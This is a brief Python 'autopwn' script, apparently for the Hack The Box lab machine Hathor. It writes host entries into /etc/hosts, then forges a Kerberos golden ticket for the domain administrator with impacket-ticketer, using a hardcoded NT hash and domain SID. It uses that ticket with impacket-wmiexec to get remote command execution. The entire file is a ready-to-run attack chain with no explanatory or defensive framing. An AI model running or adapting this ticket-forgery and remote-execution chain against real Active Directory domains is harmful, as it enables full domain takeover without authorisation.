import os
print("\n[\033[1;32m+\033[1;37m] Autopwn Hathor ~ GatoGamer1155\n")
os.system('echo "10.10.11.147 hathor.htb windcorp.htb hathor.windcorp.htb" >> /etc/hosts; bash -c "impacket-ticketer -nthash c639e5b331b0e5034c33dec179dcc792 -domain-sid S-1-5-21-3783586571-2109290616-3725730865 -domain windcorp.htb administrator; export KRB5CCNAME=administrator.ccache; impacket-wmiexec windcorp.htb/administrator@hathor.windcorp.htb -k -no-pass"')
